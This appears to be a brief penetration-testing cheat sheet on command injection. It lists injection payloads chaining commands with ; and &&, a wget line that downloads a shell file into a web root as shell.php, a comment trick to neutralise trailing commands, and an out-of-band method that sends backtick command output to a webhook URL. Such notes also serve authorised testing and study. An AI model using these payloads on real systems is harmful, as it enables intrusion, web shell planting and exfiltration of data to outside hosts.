# Command Injection

When attempting command injection, we need to think about how the command is being run. We can possibly chain commands with the ; or && operators:

```
; whoami;
&& whoami;
&& wget [shell file] > /var/www/html/shell.php;
# A hash can sometimes clear out commands after the injetion
123)^2))}';whoami;#
```

Viewing source can sometimes provide a better format than what may be output for you

### Out of Bounds Technique

This is when we need to send information to another area - such as adding a command in backticks to a webhook url and reviewing the data after it runs. We can sometimes use things like a newline separator to run these commands as well `\n`
